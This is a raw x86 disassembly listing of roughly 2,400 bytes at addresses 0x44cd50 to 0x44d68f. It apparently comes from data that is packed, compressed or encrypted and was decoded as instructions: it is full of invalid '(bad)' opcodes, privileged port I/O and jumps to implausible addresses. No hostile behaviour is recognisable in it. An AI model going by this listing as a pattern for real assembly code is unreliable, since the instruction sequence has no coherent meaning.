  44cd50:	arpl   WORD PTR [edi+0x3],bp
  44cd53:	pop    eax
  44cd54:	push   0x63dad172
  44cd59:	push   eax
  44cd5a:	push   ss
  44cd5b:	icebp  
  44cd5c:	pop    edx
  44cd5d:	gs pop es
  44cd5f:	in     eax,dx
  44cd60:	inc    eax
  44cd61:	fs xor al,0x1
  44cd64:	push   ebx
  44cd65:	add    ebx,esi
  44cd67:	out    0x73,al
  44cd69:	dec    ebp
  44cd6a:	add    ebp,ebp
  44cd6c:	push   0x61
  44cd6e:	adc    esp,edi
  44cd70:	dec    edi
  44cd71:	outs   dx,DWORD PTR ds:[esi]
  44cd72:	pop    es
  44cd73:	add    DWORD PTR [ecx],eax
  44cd75:	add    bl,BYTE PTR [ecx]
  44cd77:	fld    TBYTE PTR [edi+0x57]
  44cd7a:	fucomp st(6)
  44cd7c:	arpl   WORD PTR [edi-0x3d],bp
  44cd7f:	push   eax
  44cd80:	imul   ecx,DWORD PTR [di],0xd6d30bd
  44cd87:	ret    
  44cd88:	add    cl,BYTE PTR [ebp+0x68]
  44cd8b:	int    0x20
  44cd8d:	dec    ebx
  44cd8e:	xor    BYTE PTR [edx+0x31],bh
  44cd91:	pop    edi
	...
  44cdae:	add    BYTE PTR [eax],al
  44cdb0:	sub    al,ah
  44cdb2:	push   ebp
  44cdb3:	add    BYTE PTR ds:0x284e02bb,cl
  44cdb9:	mov    esp,DWORD PTR [edi]
  44cdbb:	pop    edi
  44cdbc:	push   ds
  44cdbd:	jl     0x44ce00
  44cdbf:	pop    edi
  44cdc0:	sbb    eax,0x306e3793
  44cdc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cdc6:	cld    
  44cdc7:	aam    0xc
  44cdc9:	jo     0x44cdfc
  44cdcb:	push   ecx
  44cdcc:	hlt    
  44cdcd:	test   BYTE PTR [eax],ah
  44cdcf:	imul   edi,edx,0xc1ffca6
  44cdd5:	pop    esi
  44cdd6:	daa    
  44cdd7:	je     0x44cda7
  44cdd9:	push   ebx
  44cdda:	xor    ch,BYTE PTR [ebp-0x6]
  44cddd:	pop    eax
  44cdde:	push   esp
  44cddf:	imul   ebx,esi,0xfc1fca6
  44cde5:	cli    
  44cde6:	es je  0x44cda3
  44cde9:	dec    edi
  44cdea:	cs fs mov edx,0xbe6953ed
  44cdf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cdf2:	cld    
  44cdf3:	sub    eax,0x6327170f
  44cdf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cdf9:	jmp    0x44ce21
  44cdfb:	ins    DWORD PTR es:[edi],dx
  44cdfc:	sahf   
  44cdfd:	pop    es
  44cdfe:	and    eax,0xfca6cc63
  44ce03:	add    ecx,DWORD PTR [esi+ebx*8]
  44ce06:	es je  0x44cdd5
  44ce09:	or     al,0x21
  44ce0b:	arpl   WORD PTR [esi-0x53],di
  44ce0e:	sub    eax,0x31f0d6e
  44ce13:	dec    ebp
	...
  44ce30:	add    BYTE PTR [eax],al
  44ce32:	jo     0x44cde1
  44ce34:	inc    ecx
  44ce35:	jae    0x44ceb6
  44ce37:	add    dh,dl
  44ce39:	xor    bh,BYTE PTR [ebx+0x50]
  44ce3c:	retf   0xd36
  44ce3f:	add    bh,bl
  44ce41:	add    al,0x4c
  44ce43:	sbb    eax,0x303246d3
  44ce48:	mov    ebx,0xe71d3b38
  44ce4d:	add    ebx,DWORD PTR ds:0x4128aa01
  44ce53:	aas    
  44ce54:	mov    ebx,0xb32f2024
  44ce59:	xor    dh,BYTE PTR [edi]
  44ce5b:	sbb    esi,DWORD PTR [edx-0x55fe86fd]
  44ce61:	sub    BYTE PTR [ecx],ah
  44ce63:	dec    ebx
  44ce64:	xor    BYTE PTR [ecx],0x29
  44ce67:	and    edi,DWORD PTR [edx+0x4c]
  44ce6a:	neg    DWORD PTR [ecx]
  44ce6c:	mov    al,BYTE PTR [ebx]
  44ce6e:	jmp    0x16d7873
  44ce73:	push   eax
  44ce74:	mov    BYTE PTR ds:0x45b21ee,dh
  44ce7a:	pop    ds
  44ce7b:	(bad)  
  44ce7c:	ss xor eax,esi
  44ce7f:	sub    esp,DWORD PTR [edi+eiz*1]
  44ce82:	call   0xee6e16b5
  44ce87:	dec    edx
  44ce88:	out    0x3,eax
  44ce8a:	(bad)  
  44ce8b:	(bad)  
  44ce8c:	adc    eax,0x483eb927
  44ce91:	xor    al,0xc1
  44ce93:	sub    al,0x35
  44ce95:	daa    
	...
  44ceb2:	add    BYTE PTR [eax],al
  44ceb4:	or     eax,0xcc034400
  44ceb9:	sbb    al,0x13
  44cebb:	dec    edi
  44cebc:	scas   al,BYTE PTR es:[edi]
  44cebd:	cs push ss
  44cebf:	and    ebp,DWORD PTR [esp+ebx*1+0x1710432]
  44cec6:	sub    ah,BYTE PTR [edi]
  44cec8:	or     DWORD PTR [ebx+0x10],0x236932
  44cecf:	(bad)  
  44ced0:	pusha  
  44ced1:	pop    ds
  44ced2:	pop    ebp
  44ced3:	cmc    
  44ced4:	push   cs
  44ced5:	dec    ebx
  44ced6:	jmp    FWORD PTR [ebp-0x3bb4d3cd]
  44cedc:	sbb    DWORD PTR ds:0xf333ce5f,esp
  44cee2:	jmp    eax
  44cee4:	or     BYTE PTR [edi+0x5f],al
  44cee7:	mov    ecx,0xb56e1b64
  44ceec:	sti    
  44ceed:	push   edx
  44ceee:	ins    BYTE PTR es:[edi],dx
  44ceef:	mov    ds:0xe9512af3,al
  44cef4:	push   cs
  44cef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cef6:	std    
  44cef7:	mov    esp,0x906a4edd
  44cefc:	jmp    0xed13329
  44cf01:	push   cs
  44cf02:	jmp    DWORD PTR [ebp-0x6ac2d415]
  44cf08:	aaa    
  44cf09:	xor    BYTE PTR [esi-0x72],bl
  44cf0c:	das    
  44cf0d:	and    ah,BYTE PTR [ebp+ebp*4+0x2f]
  44cf11:	sub    al,0x5f
  44cf13:	jmp    0x2e43c126
	...
  44cf34:	add    BYTE PTR [eax],al
  44cf36:	xor    ch,BYTE PTR [eax*2+0x69522644]
  44cf3d:	dec    eax
  44cf3e:	and    ebx,DWORD PTR [ecx*2+0x632c2e55]
  44cf45:	jmp    0x25446358
  44cf4a:	jmp    0x691b:0xff40511d
  44cf51:	fldenv ss:[ecx]
  44cf54:	imul   ecx,DWORD PTR [edx],0xe2ffffc4
  44cf5a:	or     BYTE PTR [eax+0x6e],dl
  44cf5d:	add    bh,bl
  44cf5f:	sub    edx,DWORD PTR [ecx+0x0]
  44cf62:	fistp  WORD PTR [ebx]
  44cf64:	imul   eax,DWORD PTR [eax],0xeafe0b
  44cf6a:	sub    ebp,ebp
  44cf6c:	ins    BYTE PTR es:[edi],dx
  44cf6d:	popa   
  44cf6e:	adc    BYTE PTR [edx+0x5d],cl
  44cf71:	arpl   ax,di
  44cf73:	std    
  44cf74:	xor    BYTE PTR [edx],al
  44cf76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cf77:	lock push 0x74
  44cf7a:	cwde   
  44cf7b:	in     eax,0x69
  44cf7d:	(bad)
  44cf81:	gs mov bh,0xec
  44cf84:	pop    eax
  44cf85:	fstp   DWORD PTR [bx+si+0x0]
  44cf89:	add    BYTE PTR [esi],dl
  44cf8b:	std    
  44cf8c:	ds gs js 0x44cfc9
  44cf90:	cmp    eax,DWORD PTR [ebp+0x7c]
  44cf93:	std    
  44cf94:	mov    ah,0x1
  44cf96:	pop    ebp
  44cf97:	out    dx,eax
  44cf98:	jae    0x44cfff
	...
  44cfb6:	add    BYTE PTR [eax],al
  44cfb8:	xchg   ah,ch
  44cfba:	pop    esp
  44cfbb:	arpl   WORD PTR [eax+0x4b],di
  44cfbe:	pop    ebp
  44cfbf:	arpl   WORD PTR [eax-0x3],di
  44cfc2:	jle    0x44cfc5
  44cfc4:	mov    ebx,0x45573da
  44cfc9:	fstp   DWORD PTR [eax+0x74]
  44cfcc:	mov    DWORD PTR [ebx+0x5d],ecx
  44cfcf:	arpl   ax,di
  44cfd1:	cld    
  44cfd2:	add    eax,0x5ee73600
  44cfd7:	imul   edx,edx,0xd269594b
  44cfdd:	idiv   edi
  44cfdf:	jmp    DWORD PTR [edi-0x2a8dbc04]
  44cfe5:	call   0xe7103426
  44cfea:	(bad)  
  44cfeb:	(bad)  
  44cfec:	jp     0x44cfea
  44cfee:	cmp    eax,0x49eff069
  44cff3:	gs pop ss
  44cff5:	clc    
  44cff6:	(bad)  
  44cff7:	jmp    DWORD PTR [esi+0xd653efa]
  44cffd:	adc    edx,DWORD PTR [ecx+0x67]
  44d000:	mov    ds:0x517128fa,eax
  44d005:	out    0x3,al
  44d007:	mov    BYTE PTR [edx+ebx*8],cl
  44d00a:	es je  0x44d06d
  44d00d:	mov    bh,0x20
  44d00f:	pop    edi
  44d010:	jns    0x44d00e
  44d012:	dec    ebp
  44d013:	popa   
  44d014:	jnp    0x44cfbd
  44d016:	cld    
  44d017:	fisttp DWORD PTR ds:0x642a5c
	...
  44d039:	add    BYTE PTR ds:0x596a2bc8,bh
  44d03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d040:	cld    
  44d041:	and    al,0xd
  44d043:	data16 and al,0x5f
  44d046:	aas    
  44d047:	arpl   WORD PTR [ecx],bp
  44d049:	jno    0x44d07b
  44d04b:	jne    0x44d090
  44d04d:	add    BYTE PTR ds:0x254303ec,cl
  44d053:	nop
  44d054:	xor    BYTE PTR [ecx+0x34],dl
  44d057:	and    DWORD PTR [eax],0x47962269
  44d05d:	js     0x44d06c
  44d05f:	(bad)  
  44d060:	add    eax,DWORD PTR [ecx-0x10]
  44d063:	xor    cl,BYTE PTR [ebp+ebx*2-0xe]
  44d067:	or     BYTE PTR [ebx+0x6a],0xf3
  44d06b:	jns    0x44d069
  44d06d:	ror    BYTE PTR ds:0xe25f2e5b,0xef
  44d074:	sbb    al,0x69
  44d076:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d078:	cld    
  44d079:	inc    esp
  44d07a:	pmaddwd mm4,QWORD PTR [esi]
  44d07d:	popa   
  44d07e:	in     al,0x55
  44d080:	cmp    BYTE PTR [ebx-0x41],ah
  44d083:	in     eax,0x2f
  44d085:	pop    edi
  44d086:	mov    esi,0xd0042f5
  44d08b:	push   edx
  44d08c:	std    
  44d08d:	inc    ebx
  44d08e:	test   al,0x38
  44d090:	inc    edx
  44d091:	outs   dx,BYTE PTR ds:[esi]
  44d092:	lods   al,BYTE PTR ds:[esi]
  44d093:	call   DWORD PTR [ebx]
  44d095:	sub    DWORD PTR [ebp-0x43dcf5d3],edi
  44d09b:	push   eax
  44d09d:	add    eax,DWORD PTR [eax]
	...
  44d0bb:	add    al,dl
  44d0bd:	push   ds
  44d0be:	sti    
  44d0bf:	das    
  44d0c0:	pop    esp
  44d0c1:	sbb    DWORD PTR [ecx],edx
  44d0c3:	sub    BYTE PTR [edi+esi*1+0x17],dh
  44d0c7:	xor    ah,BYTE PTR [ebx+eiz*1+0x1a]
  44d0cb:	add    al,0x16
  44d0cd:	add    BYTE PTR [esi],ah
  44d0cf:	and    eax,0x2cba1c79
  44d0d4:	ja     0x44d0fa
  44d0d6:	retf   0x3d36
  44d0d9:	xor    al,dl
  44d0db:	and    dl,BYTE PTR [edx]
  44d0dd:	add    BYTE PTR [ecx-0x35daa4ff],bl
  44d0e3:	sub    al,0x30
  44d0e5:	xor    al,0xc4
  44d0e7:	xor    eax,edi
  44d0e9:	sbb    ecx,eax
  44d0eb:	xor    ah,BYTE PTR [eax]
  44d0ed:	push   edi
  44d0ee:	out    0x3,eax
  44d0f0:	test   DWORD PTR [eax],eax
  44d0f2:	stos   DWORD PTR es:[edi],eax
  44d0f3:	sub    BYTE PTR [edi],ch
  44d0f5:	cmp    eax,0x17d84ca3
  44d0fa:	sub    BYTE PTR [edi],0x29
  44d0fd:	push   eax
  44d0fe:	xchg   ebp,eax
  44d0ff:	cs call 0x9948b845
  44d105:	add    BYTE PTR [ebx-0x7cbc10d8],ah
  44d10b:	fnsave es:[ecx]
  44d10e:	jp     0x44d132
  44d110:	sub    al,BYTE PTR [eax]
  44d112:	iret   
  44d113:	add    dl,al
  44d115:	ss push eax
  44d117:	cmp    BYTE PTR [eax-0x1fd8d4e9],bh
  44d11d:	sbb    dl,BYTE PTR [ebx+0x2d]
	...
  44d13c:	add    BYTE PTR [eax],al
  44d13e:	mov    ebp,0xc9045fff
  44d143:	and    al,0x41
  44d145:	dec    edi
  44d146:	sar    DWORD PTR [eax],1
  44d148:	add    BYTE PTR [edx],ch
  44d14a:	loope  0x44d172
  44d14c:	ins    BYTE PTR es:[edi],dx
  44d14d:	inc    ebp
  44d14e:	rcr    DWORD PTR ds:0xffb80a69,0xff
  44d155:	adc    DWORD PTR [ecx],0xb80f6344
  44d15b:	es push 0x5
  44d15e:	cmp    BYTE PTR [ecx],dh
  44d160:	push   eax
  44d161:	sti    
  44d162:	xor    DWORD PTR [ebp+0x3f],ecx
  44d165:	jmp    0x1b430c78
  44d16a:	sub    ah,BYTE PTR [ecx]
  44d16c:	addr16 cli 
  44d16e:	and    ah,BYTE PTR [ebx]
  44d170:	outs   dx,BYTE PTR ds:[esi]
  44d171:	stos   BYTE PTR es:[edi],al
  44d172:	xor    cl,BYTE PTR [edi+0x6d]
  44d175:	ficom  DWORD PTR [ebx+0x28]
  44d178:	push   ecx
  44d179:	jmp    0x9e42b78c
  44d17e:	(bad)  
  44d17f:	and    ch,BYTE PTR [edx-0x50]
  44d182:	lock das 
  44d184:	jae    0x44d13b
  44d186:	push   edx
  44d187:	and    ebp,DWORD PTR [ebp-0x3e]
  44d18a:	cli    
  44d18b:	sbb    BYTE PTR [eax-0x17],dh
  44d18e:	push   cs
  44d18f:	xchg   edx,eax
  44d190:	jmp    FWORD PTR [ebx+ebp*8-0x1064bddf]
  44d197:	sbb    ah,BYTE PTR [ebx-0x47]
  44d19a:	fcomp  QWORD PTR [eax]
  44d19c:	pop    ebp
  44d19d:	test   al,0xe
  44d19f:	xchg   ebx,eax
  44d1a0:	jmp    FWORD PTR [eax+eax*1+0x0]
	...
  44d1bf:	add    BYTE PTR [ebx],ch
  44d1c1:	and    al,BYTE PTR [ebp+ecx*4+0x31]
  44d1c5:	push   eax
  44d1c6:	outs   dx,BYTE PTR ds:[esi]
  44d1c7:	xchg   BYTE PTR ds:0xc9d0051,ch
  44d1cd:	arpl   WORD PTR ds:[esi+0x36],cx
  44d1d1:	sbb    eax,0xed1f4474
  44d1d6:	imul   ecx,DWORD PTR [eax+0x1c],0x1d
  44d1da:	inc    ebx
  44d1db:	push   ecx
  44d1dc:	into   
  44d1dd:	(bad)  
  44d1de:	(bad)  
  44d1df:	dec    ebp
  44d1e1:	add    bh,BYTE PTR [edi]
  44d1e3:	add    BYTE PTR gs:[ecx+0x68],dl
  44d1e7:	gs enter 0x4eef,0x69
  44d1ec:	jmp    0xd302:0x347766d7
  44d1f3:	add    cl,dh
  44d1f5:	frstor [ebx+0x4d]
  44d1f8:	add    esi,ebx
  44d1fa:	ins    BYTE PTR es:[edi],dx
  44d1fb:	add    BYTE PTR [esi+0x2],cl
  44d1fe:	dec    eax
  44d1ff:	imul   ebx,DWORD PTR [eax],0x296573d9
  44d205:	in     eax,0x65
  44d207:	jne    0x44d236
  44d209:	call   0x2393f6a
  44d20e:	dec    ecx
  44d20f:	add    DWORD PTR [ebx-0x2eb28c1a],esi
  44d215:	fld    TBYTE PTR [ecx+ecx*2-0x50]
  44d219:	out    0x64,al
  44d21b:	inc    ebx
  44d21c:	mov    esi,esi
  44d21e:	gs je  0x44d1d5
  44d221:	add    DWORD PTR [esi+0x1],ecx
	...
  44d240:	add    BYTE PTR [eax],al
  44d242:	jae    0x44d22a
  44d244:	jae    0x44d293
  44d246:	rcr    ebx,0x6c
  44d249:	push   ebx
  44d24a:	pusha  
  44d24b:	loop   0x44d2c0
  44d24d:	gs mov ah,0x1
  44d250:	or     al,BYTE PTR [ecx]
  44d252:	jae    0x44d23a
  44d254:	jae    0x44d299
  44d256:	mov    dl,ah
  44d258:	push   0x73
  44d25a:	stos   BYTE PTR es:[edi],al
  44d25b:	loop   0x44d2c1
  44d25d:	mov    gs:0x9702ec01,eax
  44d263:	jmp    0x614f:0xde81746a
  44d26a:	out    0xe1,al
  44d26c:	fs gs rcr dh,0x69
  44d271:	jae    0x44d290
  44d273:	ficomp DWORD PTR [ebp+0x6f]
  44d276:	or     eax,0xff103ee
  44d27b:	repz xor DWORD PTR [edi-0x52],ebx
  44d27f:	push   ecx
  44d280:	push   esp
  44d281:	imul   edi,DWORD PTR [ebp-0x57b4cc0d],0xa5432f44
  44d28b:	xchg   esi,eax
  44d28c:	cld    
  44d28d:	push   edx
  44d28e:	or     al,0xde
  44d290:	push   ds
  44d291:	je     0x44d25b
  44d293:	add    esp,DWORD PTR [esi]
  44d295:	jae    0x44d25b
  44d297:	or     bl,BYTE PTR [edi]
  44d299:	imul   ebx,DWORD PTR [edi+0x4],0x21
  44d29d:	je     0x44d2ac
  44d29f:	repnz add al,BYTE PTR [ecx+0x70]
  44d2a3:	mov    bl,0x47
  44d2a5:	arpl   WORD PTR [eax],ax
	...
  44d2c3:	add    BYTE PTR [ebx-0x54],ah
  44d2c6:	cld    
  44d2c7:	add    eax,0x6a1f0c0f
  44d2cc:	pop    eax
  44d2cd:	jo     0x44d2f7
  44d2cf:	arpl   WORD PTR [eax+0x65],bp
  44d2d2:	xor    ch,BYTE PTR [ecx+0x60]
  44d2d5:	addr16 and eax,0xfcd33b67
  44d2db:	jne    0x44d2e9
  44d2dd:	pop    esi
  44d2de:	pop    ds
  44d2df:	je     0x44d33f
  44d2e1:	je     0x44d305
  44d2e3:	dec    ebx
  44d2e4:	sub    ch,al
  44d2e6:	das    
  44d2e7:	add    BYTE PTR ds:0x284d0255,cl
  44d2ed:	mov    ecx,DWORD PTR [ecx+0x63]
  44d2f0:	adc    al,0x79
  44d2f2:	and    eax,0x517b1f5f
  44d2f7:	je     0x44d2e5
  44d2f9:	xchg   edx,eax
  44d2fa:	pop    ds
  44d2fb:	add    BYTE PTR ds:0xf0410389,cl
  44d301:	xor    cl,BYTE PTR [eax+0x63]
  44d304:	jecxz  0x44d331
  44d306:	dec    esp
  44d307:	je     0x44d2f9
  44d309:	sub    ecx,DWORD PTR [esp+eax*2+0xd]
  44d30d:	add    BYTE PTR [esi+0x6],al
  44d310:	retf   
  44d311:	and    al,BYTE PTR [edx+0x2d]
  44d314:	loopne 0x44d349
  44d316:	dec    esp
  44d317:	fcom   QWORD PTR ss:[esi]
  44d31a:	cmp    DWORD PTR [eax],esp
  44d31c:	mov    ah,0x34
  44d31e:	xor    al,0x21
  44d320:	test   al,0x30
  44d322:	dec    eax
  44d323:	and    ebp,DWORD PTR [esi+0x3e754]
	...
  44d345:	add    BYTE PTR [esi-0xfa9dbb0],bh
  44d34b:	icebp  
  44d34c:	rcr    BYTE PTR [edi],1
  44d34e:	test   eax,0x3f03e71b
  44d353:	jmp    DWORD PTR ds:0x13308236
  44d359:	push   edx
  44d35a:	outs   dx,BYTE PTR ds:[esi]
  44d35b:	adc    BYTE PTR cs:[edx],ah
  44d35e:	or     BYTE PTR [edi+0x10],0x23
  44d362:	addr16 and ebx,edi
  44d365:	xor    BYTE PTR [ebx+0x25],bh
  44d368:	adc    al,BYTE PTR [esi+ecx*8]
  44d36b:	add    BYTE PTR [esi-0x2ccf9dcb],ah
  44d371:	inc    edx
  44d372:	outs   dx,BYTE PTR ds:[esi]
  44d373:	xor    al,0x9e
  44d375:	and    BYTE PTR [edx+0x50],al
  44d378:	enter  0x6235,0x1d
  44d37c:	out    0x3,eax
  44d37e:	rol    DWORD PTR [eax],cl
  44d380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d381:	xor    eax,0x4cbb303a
  44d386:	xor    BYTE PTR ss:[edx-0x73c8e6cb],bh
  44d38d:	cmp    al,0xd
  44d38f:	add    BYTE PTR [edx+0x3],dl
  44d392:	shr    BYTE PTR ds:0x44013390,1
  44d398:	test   BYTE PTR [esi],dh
  44d39a:	stc    
  44d39b:	sub    eax,0x24d03c92
  44d3a0:	add    BYTE PTR [ebx],0xbf
  44d3a3:	add    BYTE PTR [eax],al
  44d3a5:	stos   BYTE PTR es:[edi],al
  44d3a6:	and    BYTE PTR [ebx],dh
  44d3a8:	jo     0x44d41f
	...
  44d3c6:	add    BYTE PTR [eax],al
  44d3c8:	and    bl,BYTE PTR [edi]
  44d3ca:	ins    DWORD PTR es:[edi],dx
  44d3cb:	pop    ebp
  44d3cc:	and    ebx,DWORD PTR [ecx]
  44d3ce:	ja     0x44d401
  44d3d0:	cs sbb eax,0x10ee968
  44d3d6:	jmp    DWORD PTR [ebx]
  44d3d8:	(bad)  
  44d3d9:	cs pop edi
  44d3db:	push   ebp
  44d3dc:	loopne 0x44d400
  44d3de:	fs jmp 0x1b42c6f2
  44d3e4:	or     ah,BYTE PTR [ecx]
  44d3e6:	cmp    eax,0x744b023b
  44d3eb:	or     al,0xc8
  44d3ed:	push   ds
  44d3ee:	ja     0x44d414
  44d3f0:	rcl    DWORD PTR [eax+0x0],1
  44d3f3:	fst    DWORD PTR [eax]
  44d3f5:	cmp    ah,BYTE PTR [ebx+0x6]
  44d3f8:	dec    eax
  44d3f9:	sbb    al,0x69
  44d3fb:	cli    
  44d3fc:	sbb    eax,DWORD PTR [ebp+0x63]
  44d3ff:	add    BYTE PTR [ecx],cl
  44d401:	push   edx
  44d402:	jmp    FWORD PTR ds:0xfe54340a
  44d408:	xor    DWORD PTR [edi],ebx
  44d40a:	push   0xffffffb0
  44d40c:	and    al,0x1e
  44d40e:	imul   ebx,ebx,0xc0744b2b
  44d414:	cmc    
  44d415:	adc    eax,0x430fd600
  44d41a:	push   0xffffffd0
  44d41c:	jmp    0x6331:0xe7cd5f22
  44d423:	call   0x33f7:0xbb734d0b
  44d42a:	ja     0x44d3d9
	...
  44d448:	add    BYTE PTR [eax],al
  44d44a:	sti    
  44d44b:	sbb    al,0x5d
  44d44d:	fwait
  44d44e:	out    0x2f,eax
  44d450:	je     0x44d3d8
  44d452:	inc    eax
  44d453:	add    BYTE PTR [eax],al
  44d455:	push   edi
  44d456:	or     edi,DWORD PTR ds:0x53f80063
  44d45c:	pop    ebp
  44d45d:	arpl   cx,di
  44d45f:	hlt    
  44d460:	pusha  
  44d461:	je     0x44d440
  44d463:	jmp    0x7060:0xf497735c
  44d46a:	mov    eax,0xc54469d8
  44d46f:	in     al,0x6b
  44d471:	add    dh,ah
  44d473:	add    edi,DWORD PTR [ebx]
  44d475:	outs   dx,DWORD PTR ds:[esi]
  44d476:	add    ch,dh
  44d478:	pop    esp
  44d479:	jb     0x44d473
  44d47b:	push   esp
  44d47c:	je     0x44d4f0
  44d47e:	fst    st(5)
  44d480:	pop    esi
  44d481:	push   ebx
  44d482:	ftst   
  44d484:	ins    BYTE PTR es:[edi],dx
  44d485:	jb     0x44d454
  44d487:	out    dx,eax
  44d488:	jo     0x44d4ce
  44d48a:	or     ebp,esi
  44d48c:	pop    edx
  44d48d:	jb     0x44d48c
  44d48f:	repz jae 0x44d501
  44d492:	es push eax
  44d494:	addr16 push ebx
  44d496:	or     ebx,esp
  44d498:	ins    BYTE PTR es:[edi],dx
  44d499:	jb     0x44d4b8
  44d49b:	lock jo 0x44d4e2
  44d49e:	or     ebx,esi
  44d4a0:	pop    edx
  44d4a1:	jb     0x44d4b0
  44d4a3:	hlt    
  44d4a4:	jae    0x44d515
  44d4a6:	out    0x50,al
  44d4a8:	add    BYTE PTR [eax],al
  44d4aa:	mov    eax,ds:0x653efe
	...
  44d4cb:	add    BYTE PTR [eax-0x169ca2ac],bh
  44d4d1:	repz pusha 
  44d4d3:	je     0x44d4b2
  44d4d5:	jmp    0xf40c4836
  44d4da:	pusha  
  44d4db:	jo     0x44d555
  44d4dd:	fsubr  DWORD PTR [ecx+0x53]
  44d4e0:	aad    0xe4
  44d4e2:	imul   eax,DWORD PTR [eax],0x1e
  44d4e5:	add    ecx,DWORD PTR [ebx+0x65]
  44d4e8:	js     0x44d53e
  44d4ea:	pop    ebp
  44d4eb:	arpl   WORD PTR [ecx-0xd],di
  44d4ee:	pusha  
  44d4ef:	je     0x44d4fe
  44d4f1:	nop
  44d4f2:	cmp    BYTE PTR [ebx-0x2],ah
  44d4f5:	jne    0x44d529
  44d4f7:	addr16 std 
  44d4f9:	sub    ch,BYTE PTR [eax]
  44d4fb:	outs   dx,BYTE PTR ds:[esi]
  44d4fc:	fidiv  WORD PTR [edi+0x23]
  44d4ff:	ins    BYTE PTR es:[edi],dx
  44d500:	or     eax,0xe84e0281
  44d505:	or     DWORD PTR [ebp+0x73],0x523b44f0
  44d50c:	in     al,dx
  44d50d:	cmp    ch,BYTE PTR [edi]
  44d50f:	arpl   ax,dx
  44d511:	dec    esi
  44d512:	dec    ecx
  44d513:	add    BYTE PTR ds:0xb04dfe38,cl
  44d519:	cmp    DWORD PTR [ecx+0x70],eax
  44d51c:	test   al,0x38
  44d51e:	inc    ebp
  44d51f:	arpl   WORD PTR [ebx+ebx*8-0x26f2aec5],sp
  44d526:	std    
  44d527:	dec    ebp
  44d528:	mov    al,0xf9
  44d52a:	dec    esp
  44d52b:	arpl   WORD PTR [ecx+0x6c22f0],bx
	...
  44d54d:	add    BYTE PTR [eax+0x5a783efc],al
  44d553:	xchg   edi,eax
  44d554:	cld    
  44d555:	xor    DWORD PTR [edx+ebx*8],ecx
  44d558:	push   ds
  44d559:	je     0x44d59c
  44d55b:	add    al,0x22
  44d55d:	popa   
  44d55e:	popa   
  44d55f:	dec    DWORD PTR [edi+eiz*2+0x69]
  44d563:	xchg   edi,eax
  44d564:	cld    
  44d565:	lock or al,0x72
  44d568:	sub    al,0x63
  44d56a:	arpl   WORD PTR [edi+0x2e],sp
  44d56d:	imul   ebp,DWORD PTR [esi],0x596d2dbc
  44d573:	push   0x25
  44d575:	arpl   WORD PTR [ebx],bp
  44d577:	xchg   edi,eax
  44d578:	cld    
  44d579:	push   eax
  44d57a:	or     al,0x62
  44d57c:	pop    ds
  44d57d:	je     0x44d5bd
  44d57f:	rcr    BYTE PTR [eax],0x4d
  44d582:	sbb    BYTE PTR [ebp+0x217343],dh
  44d588:	(bad)  
  44d589:	and    edx,DWORD PTR es:[edi]
  44d58c:	xchg   ebx,eax
  44d58d:	cmp    al,0xd
  44d58f:	add    BYTE PTR [ebx],dl
  44d591:	add    eax,0x25842fd4
  44d596:	loope  0x44d5af
  44d598:	jne    0x44d5ba
  44d59a:	shl    BYTE PTR [ebx],cl
  44d59c:	xchg   ebx,eax
  44d59d:	lock and al,BYTE PTR es:[ecx-0x5e013afd]
  44d5a5:	and    cl,ah
  44d5a7:	dec    esp
  44d5a8:	push   eax
  44d5a9:	and    al,al
  44d5ab:	xor    al,BYTE PTR [ebp+0x45]
  44d5ae:	mov    esi,0x273f33
	...
  44d5cf:	add    BYTE PTR [ebx-0x7c2acea],dh
  44d5d5:	sbb    BYTE PTR [esi+eiz*1],bh
  44d5d8:	mov    ecx,0xe8043aff
  44d5dd:	sub    eax,0x2299254c
  44d5e2:	pop    ss
  44d5e3:	xor    ah,BYTE PTR [esp+ebx*1+0x3ea0330c]
  44d5ea:	push   ss
  44d5eb:	push   ecx
  44d5ec:	js     0x44d60b
  44d5ee:	adc    eax,0x72000d4f
  44d5f3:	add    al,0x49
  44d5f5:	pop    ss
  44d5f6:	adc    ch,BYTE PTR [ebx]
  44d5f8:	jle    0x44d62a
  44d5fa:	pop    ss
  44d5fb:	xor    dh,BYTE PTR [edx+0x2e]
  44d5fe:	add    BYTE PTR [eax],ch
  44d600:	outs   dx,BYTE PTR ds:[esi]
  44d601:	pop    ds
  44d602:	add    al,0x4e
  44d604:	cmp    dl,BYTE PTR [esp+ebx*8]
  44d607:	and    BYTE PTR [eax+eax*1],bh
  44d60a:	cli    
  44d60b:	add    ecx,DWORD PTR [edx]
  44d60d:	sbb    al,0xbd
  44d60f:	xor    BYTE PTR [eax],dh
  44d611:	sub    al,0xb3
  44d613:	xor    BYTE PTR es:0x192353d1,bl
  44d61a:	mov    cl,0x2c
  44d61c:	cmp    DWORD PTR ds:0x14edce00,ebx
  44d622:	add    BYTE PTR [ecx+edx*1-0x1d6f95c1],ch
  44d629:	push   ds
  44d62a:	pop    edi
  44d62b:	xchg   ebp,eax
  44d62c:	sub    eax,0x329a7735
  44d631:	and    ebp,DWORD PTR [ebx-0x46]
	...
  44d650:	add    BYTE PTR [eax],al
  44d652:	xor    esi,DWORD PTR es:[ebp+ecx*4+0x2b]
  44d657:	xor    DWORD PTR [edx-0x5c],ebp
  44d65a:	es push ecx
  44d65c:	add    BYTE PTR ds:0x706de50e,ch
  44d662:	push   ds
  44d663:	sub    al,0x41
  44d665:	dec    esp
  44d666:	sbb    eax,0xf95a5f38
  44d66b:	dec    edi
  44d66c:	pop    edi
  44d66d:	pop    ebx
  44d66e:	out    dx,al
  44d66f:	sbb    al,BYTE PTR [eax]
  44d671:	cwde   
  44d672:	adc    ebp,esp
  44d674:	ins    DWORD PTR es:[edi],dx
  44d675:	inc    eax
  44d676:	stc    
  44d677:	sub    edi,DWORD PTR [edi]
  44d679:	dec    edx
  44d67a:	fidiv  WORD PTR [edx]
  44d67c:	cmp    eax,DWORD PTR [bp+si]
  44d67f:	in     eax,0x68
  44d681:	aas    
  44d682:	frstor [edx]
  44d684:	js     0x44d6a3
  44d686:	sar    bh,0xff
  44d689:	mov    cl,0x11
  44d68b:	in     eax,0x6d
  44d68d:	adc    BYTE PTR [ecx],bh
  44d68f:	sub    al,0x4e
